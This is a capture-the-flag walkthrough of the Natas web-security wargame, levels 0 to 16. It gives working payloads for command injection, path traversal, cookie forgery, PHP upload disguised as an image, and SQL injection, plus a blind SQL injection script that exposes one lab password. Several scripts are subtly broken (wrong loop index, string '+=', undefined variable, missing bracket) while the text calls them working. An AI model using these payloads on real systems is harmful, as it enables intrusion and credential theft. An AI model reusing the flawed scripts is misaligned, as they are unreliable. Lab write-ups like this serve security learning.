# Natas
Exercises to learn and practice security concepts in the form of fun-filled games.


## Natas 0 🡆 Natas 1
This one is a pretty straightforward lesson in web security: don't hide your credentials in a plaintext HTML comment.

## Natas 1 🡆 Natas 2
This one is also a pretty straightforward lesson in web security: don't use Javascript as a security barrier for your plaintext HTML comment credentials. Disabling right-click events is extremely easy to bypass... Heck, there's even [Chrome extensions that circumvent it.](https://chrome.google.com/webstore/detail/righttocopy/plmcimdddlobkphnofejmeidjblideca?hl=en)


## Natas 2 🡆 Natas 3
Alright... no more plaintext HTML comment credentials... instead, we're greeted with `<img src="files/pixel.png">`, displaying a single white pixel-sized image. `pixel.png` resides within the `files` directory... Let's see if the server's configured for listing the contents of `files`.

![image](https://i.imgur.com/LAW5QoN.png)

Oh look, it is! And... what's this? `users.txt`? Let's take a peek:

~~~~
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:[censored]
eve:zo4mJWyNj2
mallory:9urtcpzBmH
~~~~

Bingo!


## Natas 3 🡆 Natas 4
Let's take a look under the hood again...



Not even Google will find it this time, eh?

A common method of preventing search engines/web crawlers from indexing pages is to use a file called "robots.txt" at the webroot. Let's take a peek and see if there's one on this server.

`http://natas3.natas.labs.overthewire.org/robots.txt`

~~~~
User-agent: *
Disallow: /s3cr3t/
~~~~

Oooh... "s3cr3t", huh? Sounds fun. Let's see if this server lists the contents of the directory like the last one did.

![image](https://i.imgur.com/dVmxu8i.png)

Another `users.txt`! And inside of that, we have:

`natas4:[censored]`


## Natas 4 🡆 Natas 5
Hm...

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

Well, one way to track what website a user is coming from is the "referer" HTTP header. We can try modifying our own referer header so it says "http://natas5.natas.labs.overthewire.org/" to see what happens.

`Access granted. The password for natas5 is [censored]`


## Natas 5 🡆 Natas 6
`Access disallowed. You are not logged in`

Not logged in... Websites usually track sessions using cookies, so let's see if there's any we can play with.

Here's one called "loggedin" which has a value of 0. What do you want to bet changing that to 1 will "log us in"? Let's try it.

Change the content to 1... Refresh, and...

`Access granted. The password for natas6 is [censored]`


## Natas 6 🡆 Natas 7
Well this is different:

___

<div id="content">


<form method="post">
Input secret: <input name="secret"><br>
<input type="submit" name="submit">
</form>

<div id="viewsource"><a href="index-source.html" style="float:right;">View sourcecode</a></div>
</div>

___

We've got an input box, and a "view sourcecode" button. That button is probably a good place to start.

~~~~
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "<censored>" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
~~~~

Luckily no plaintext password check in the main script, so I'll give them that. But what is this `$secret` variable, and where does it come from? It's not defined here, so it must come from `includes/secret.inc` I wonder if we can take a peek at that file by navigating to it in our browser.

~~~~
<?
$secret = "[censored]";
?>
~~~~

Nice... totally secure.

Alright, well we've got our secret. Let's go enter it in the box at the beginning.
___

<div id="content">

Access granted. The password for natas7 is [censored]
<form method="post">
Input secret: <input name="secret"><br>
<input type="submit" name="submit">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>

___

## Natas 7 🡆 Natas 8
`content` is starting to get a lot more interesting.
~~~~
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>

~~~~

Well, the hint is interesting. Somehow we need to get this PHP script going out into the root directory, then into `etc/natas_webpass/natas8`. Let's take a look at what we've got to work with.

We've got our index.php, which seems to take a "page" $_GET parameter. *Hopefully* "home" and "about" are just sibling files it's taking and dumping into the DOM. We can test this out by going to `http://natas7.natas.labs.overthewire.org/about`.

And we get `this is the about page`. Cool! Maybe we can have index.php back out to the root, and dump the contents of `/etc/natas_webpass/natas8`. Let's just throw the filepath into that "page" parameter and see what we get.

~~~~
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
[censored]

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
~~~~

## Natas 8 🡆 Natas 9
We're presented with the same box as last time. Let's see what the source code is.

~~~~
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas8", "pass": "<censored>" };</script></head>
<body>
<h1>natas8</h1>
<div id="content">

<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
~~~~

So this time, instead of plaintext, they're encoding it.

The problem with encoding passwords, is they can be decoded... especially easily, if we know how it was encoded to begin with. Looks like they're converting the password to base64, then reversing the order, then finally converting it to hexadecimal.

Pretty straightforward. Converting it from hexadecimal, reversing it, then converting it from base64 should yield the decoded secret that we can give the input box.

Let's write some PHP:

~~~~
<?php

echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));
~~~~

We can run this with the command `php -a`, with the result to paste into the input box echoed back to us.

We get our result, let's try it out:

~~~~
<div id="content">

Access granted. The password for natas9 is [censored]
<form method="post">
Input secret: <input name="secret"><br>
<input type="submit" name="submit">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
~~~~


## Natas 9 🡆 Natas 10
Oh boy, this is bad:

~~~~
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
~~~~

We've got access to the shell. `passthru()` is used to execute a command, just as we would in the terminal. The command that's being executed is `grep -i $key dictionary.txt`, where $key is our input to the "needle" $_GET parameter. We can escape the `grep` command by using a semicolon, and then feed a command of our own to it. So, for example, we can go to `http://natas9.natas.labs.overthewire.org/?needle=test;ls%20-l;` , which would execute the command `grep -i test; ls -l; dictionary.txt`

Which outputs:

~~~

<div id="content">
<form>
Find words containing: <input name="needle"><input type="submit" name="submit" value="Search"><br><br>
</form>


Output:
<pre>total 464
-rw-r----- 1 natas9 natas9 460878 Dec 15  2016 dictionary.txt
-rw-r----- 1 natas9 natas9   1952 Dec 20  2016 index-source.html
-rw-r----- 1 natas9 natas9   1185 Dec 20  2016 index.php
-rw-r----- 1 natas9 natas9   1165 Dec 15  2016 index.php.tmpl
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>

~~~~

Let's try cat-ing a file, specifically `/etc/natas_webpass/natas10`. Hopefully we can get the password in plaintext to move onto the next round.

Our URL will be `http://natas9.natas.labs.overthewire.org/?needle=test;cat%20/etc/natas_webpass/natas10;`.

Output:

~~~~
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
[censored]
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
~~~~


## Natas 10 🡆 Natas 11
Same as the last one, but this time there's filtering on the input.

The regular expression used as the filter is: `/[;|&]/`, so no semicolons this time... we have to use grep.

The option `-i` performs case-insensitive matching, and we can use grep to search multiple files. That means we can pass `/etc/natas_webpass/natas10` in addition to dictionary.txt that's already part of the command. Let's start by just searching for a random letter in both files.

So if we want to execute the command `grep -i [letter] /etc/natas_webpass/natas11 dictionary.txt`, we'd want our query in the textbox to be `[letter] /etc/natas_webpass/natas11`

How about we try `k` first?

Query: `k /etc/natas_webpass/natas11`

Output:

~~~~
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
/etc/natas_webpass/natas11:[censored]
dictionary.txt:Eskimo
dictionary.txt:Eskimo's
dictionary.txt:Eskimos
dictionary.txt:Greek
...
</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
~~~~


## Natas 11 🡆 Natas 12
~~~~
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas11", "pass": "<censored>" };</script></head>
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
~~~~
Wow, that's a bit more complicated than the last ones. We need to break this down to figure out what it does.

We have an xor_encrypt() function to start with... The cool thing about XOR encoding is that it's vulnerable to known-plaintext attacks, i.e. if we give it a plaintext string we know, and obtain the result, we can figure out the key that's used to encrypt it.

We use this xor_encrypt() function against the base64-decoded "data" cookie in our browser to give us our JSON for $tempdata. $tempdata has an array key called "showpassword", which needs to be "yes" in order for the password to be printed.

Sounds easy enough. Let's fill in some blanks.

We'll start by lifting the xor_encrypt() function out of natas12 and into our own script, so we can play with it a bit.


~~~~
<?php  
  
$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=";  
  
function xor_encrypt($in) {  
    $key = json_encode(["showpassword"=>"no", "bgcolor"=>"#ffffff"]);  
    $text = $in;  
    $outText = '';  
  
    // Iterate through each character  
    for($i=0;$i<strlen($text);$i++) {  
    $outText .= $text[$i] ^ $key[$i % strlen($key)];  
    }  
  
    return $outText;  
}  
  
echo xor_encrypt(base64_decode($cookie));
~~~~

We know our cookie, the status of "showpassword", and "bgcolor". Let's see what this spits out.

`php -f natas11.php`

`qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq`

Cool! It's just `qw8J` repeating over and over again. We can feed this back in as the key, but this time with "showpassword" as "yes". Based on what we know about known-plaintext attacks, base64-encoding the result should yield the cookie to feed the server to get what we want.

~~~~
<?php  
  
$cookie = json_encode(["showpassword" => "yes", "bgcolor" => "#ffffff");  
  
function xor_encrypt($in) {  
    $key = 'qw8J';
    $text = $in;  
    $outText = '';  
  
    // Iterate through each character  
    for($i=0;$i<strlen($text);$i++) {  
    $outText .= $text[$i] ^ $key[$i % strlen($key)];  
    }  
  
    return $outText;  
}  
  
echo base64_encode(xor_encrypt($cookie));
~~~~

`php -f natas11.php`

`ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`

This looks good, at first glance. Let's change our cookie in our browser to this, and refresh the page. Here goes:

~~~~
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>

The password for natas12 is [censored]<br>
<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
~~~~


## Natas 12 🡆 Natas 13
These are definitely starting to get creative.

___

<div id="content">

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="l3csz7gkhs.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html" style="float:right;">View sourcecode</a></div>
</div>

___

Let's take a look at the source.

~~~~
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas12</h1> 
<div id="content"> 
<?  

function genRandomString() { 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
} else { 
?> 

<form enctype="multipart/form-data" action="index.php" method="POST"> 
<input type="hidden" name="MAX_FILE_SIZE" value="1000" /> 
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
Choose a JPEG to upload (max 1KB):<br/> 
<input name="uploadedfile" type="file" /><br /> 
<input type="submit" value="Upload File" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
~~~~

So it wants a .JPG, does it? Let's give it one... but not one with image data. I'm thinking some malicious PHP would be a great payload for this script.

For our payload, since we want to read `/etc/natas_webpass/natas8`, let's go with `<?php echo file_get_contents("/etc/natas_webpass/natas13");` and save it as "totally_not_a_trojan.jpg".

Now, before we upload this, we need to change the `<input>` tag slightly. As it is, it will create a .JPG file on the server... but we want to change that extension to .php so we can have the web server run the code we uploaded. So...

`<input type="hidden" name="filename" value="36xisyea6a.jpg" />`

becomes...

`<input type="hidden" name="filename" value="36xisyea6a.php" />`

Let's give 'er a whirl. Up goes "totally_not_a_trojan.jpg" and down comes:

___

<div id="content">
The file <a href="upload/69bgptyktf.php">upload/69bgptyktf.php</a> has been uploaded<div id="viewsource"><a href="index-source.html" style="float:right;">View sourcecode</a></div>
</div>

___

Cool, it even comes with a link we can click! How thoughtful of them...

Let's click it, we should get the password.

`[censored]`

Nice.

## Natas 13 🡆 Natas 14
___
<div id="content">
For security reasons, we now only accept image files!<br/><br/>


<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="qghrgbtrz9.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html" style="float:right;">View sourcecode</a></div>
</div>

___

Hahaha! Slight oversight, much?

Anywho, let's take a look at what they've "fixed".

~~~~
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas13</h1> 
<div id="content"> 
For security reasons, we now only accept image files!<br/><br/> 

<?  

function genRandomString() { 
    $length = 10; 
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
    $string = "";     

    for ($p = 0; $p < $length; $p++) { 
        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
    } 

    return $string; 
} 

function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 

if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
     
    $err=$_FILES['uploadedfile']['error']; 
    if($err){ 
        if($err === 2){ 
            echo "The uploaded file exceeds MAX_FILE_SIZE"; 
        } else{ 
            echo "Something went wrong :/"; 
        } 
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
        echo "File is not an image"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
} else { 
?> 

<form enctype="multipart/form-data" action="index.php" method="POST"> 
<input type="hidden" name="MAX_FILE_SIZE" value="1000" /> 
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" /> 
Choose a JPEG to upload (max 1KB):<br/> 
<input name="uploadedfile" type="file" /><br /> 
<input type="submit" value="Upload File" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
~~~~

Looks like the only thing they did was add an `else if(!exif_imagetype())` to the file checking routine. Luckily, this function just checks the [magic number](http://en.wikipedia.org/wiki/Magic_number_(programming)) at the beginning of a file to see if it says it's an image. But files can lie, and we're going to teach "totally_not_a_trojan.jpg" to do so. Wikipedia says JPEG files begin with `FF` and `D8`, and the next two bytes are inconsequential. Let's wrap our PHP in those bytes, and see if we can fool `exif_imagetype()`.

Using Bash, a suitable command would be:

`printf "\xFF\xD8\xFF\xFF" | cat - totally_not_a_trojan.jpg > totally_not_another_trojan.jpg`




Up goes "totally_not_another_trojan.jpg" and down comes:

___

<div id="content">
For security reasons, we now only accept image files!<br/><br/>

The file <a href="upload/2b8uzsaqet.php">upload/2b8uzsaqet.php</a> has been uploaded<div id="viewsource"><a href="index-source.html" style="float:right;">View sourcecode</a></div>
</div>

___


Beautiful, simple, elegant. Let's give it a visit.

`����[censored]`

Bingo! The first four bytes are there because the PHP compiler echoes back anything outside of the PHP brackets, and those bytes represent our JPG magic number.

## Natas 14 🡆 Natas 15
What've you got in store for us this time, Natas?

~~~~
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas14</h1> 
<div id="content"> 
<? 
if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas14', '<censored>'); 
    mysql_select_db('natas14', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    if(mysql_num_rows(mysql_query($query, $link)) > 0) { 
            echo "Successful login! The password for natas15 is <censored><br>"; 
    } else { 
            echo "Access denied!<br>"; 
    } 
    mysql_close($link); 
} else { 
?> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
Password: <input name="password"><br> 
<input type="submit" value="Login" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
~~~~

Oh! MySQL! I love databases... so many fun things you can do with them.

So many more fun things you can do with them when they live on someone else's web server, and the input being fed to it isn't being filtered at all.

That's right, folks... textbook SQL injection attack inbound. Let's see...

`SELECT * FROM users WHERE username="<username field>" AND password="<password field>"`

We don't know the password, so what we really want is:

`SELECT * FROM users WHERE username="natas15"`

We can rig up our input to say exactly that, but then comment out the rest so it doesn't do the `AND` against the password column.

If we feed it `natas15" #`, the query should now be:

`SELECT * FROM users WHERE username="natas15" #" AND password=""`

Effectively creating that query that only checks the username column.

Let's try it!

___
<div id="content">
Successful login! The password for natas15 is [censored]<br><div id="viewsource"><a href="index-source.html" style="float:right;">View sourcecode</a></div>
</div>

___

Easy as pie.


## Natas 15 🡆 Natas 16
~~~~
<html> 
<head> 
<!-- This stuff in the header has nothing to do with the level --> 
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css"> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" /> 
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" /> 
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script> 
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script> 
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script> 
<script>var wechallinfo = { "level": "natas15", "pass": "<censored>" };</script></head> 
<body> 
<h1>natas15</h1> 
<div id="content"> 
<? 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas15', '<censored>'); 
    mysql_select_db('natas15', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        echo "This user exists.<br>"; 
    } else { 
        echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
} else { 
?> 

<form action="index.php" method="POST"> 
Username: <input name="username"><br> 
<input type="submit" value="Check existence" /> 
</form> 
<? } ?> 
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div> 
</div> 
</body> 
</html> 
~~~~

This one's a little trickier, because we don't get direct output from our SQL query. Instead, we get one of three possible outputs:

- This user exists.
- This user doesn't exist.
- Error in query.

The input still isn't being filtered, so we can still perform SQL injection... but we'll be flying blind a little.

Here's the query as it stands:

`SELECT * FROM users WHERE username="<our input>"`

And here's what we want our query to be first:

`SELECT * FROM users WHERE username="natas16" AND password LIKE BINARY "%<character>%"`

This'll tell us if this letter even exists in the password at all, regardless of position. Repeating this for every letter (lowercase and uppercase) plus 0-9 should give us our "library" of characters that exist in the password.

Let's write us some PHP to automate this process.

~~~~
<?php

function post($url, $data)
{
    $username = "natas15";
    $password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n" . "authorization: Basic $string",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}


$c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$library = '';

for ($i = 0; $i < strlen($c); $i++)
{
    $character = $c[$i];
    $r = post("http://natas15.natas.labs.overthewire.org/index.php?debug", ['username' => "natas16\" AND password LIKE BINARY \"%$character%\"#"]);
    if (strpos($r, "<br>This user exists.<br>"))
    {
        $library += $character;
    }
}

var_dump($e);
~~~~

The output of which represents our "library".

To figure out if a given character from our library exists in that position of the password, we can modify our SQL query slightly to account for position.

`SELECT * FROM users WHERE username="natas16" AND password LIKE BINARY "<character>%"`

Here's our new PHP:

~~~~
<?php

function post($url, $data)
{
    $username = "natas15";
    $password = "[censored]";
    $string = base64_encode("$username:$password");

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n" . "authorization: Basic $string",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ]
    ];

    $context  = stream_context_create($options);
    $raw_response = file_get_contents($url, false, $context);
    return $raw_response;
}


$c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$library = '';

for ($i = 0; $i < strlen($c); $i++)
{
    $character = $c[$i];
    $r = post("http://natas15.natas.labs.overthewire.org/index.php?debug", ['username' => "natas16\" AND password LIKE BINARY \"%$character%\"#"]);
    if (strpos($r, "<br>This user exists.<br>"))
    {
        $library .= $character;
    }
}

$password = '';

for ($i = 0; $i < 32; $i++)
{
    for ($j = 0; $j < strlen($library); $j++)
    {
        $character = $library[$i];
        $r = post("http://natas15.natas.labs.overthewire.org/index.php?debug", ['username' => "natas16\" AND password LIKE BINARY \"$password$character%\"#"]);
        if (strpos($r, "<br>This user exists.<br>"))
        {
            $password .= $character;
            echo "$password\n";
        }
    }
}
~~~~

We iterate through all 32 characters of the password, and for each position, we try a character from our library. Eventually, we should have our password! Let's run this.


With the echo statement, we can see our password build itself before our very eyes!

Finally, we have something. And it works!


## Natas 16 🡆 Natas 17

~~~~
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
